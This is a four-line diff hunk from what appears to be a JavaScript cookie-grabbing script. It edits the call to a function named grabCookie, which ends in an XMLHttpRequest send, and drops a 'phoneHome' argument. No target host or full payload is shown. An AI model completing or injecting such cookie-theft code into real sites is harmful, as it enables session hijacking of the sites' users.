@@ -18,4 +18,4 @@ function grabCookie()
   xmlhttp.send();
 }
 
-grabCookie(phoneHome);
+grabCookie();
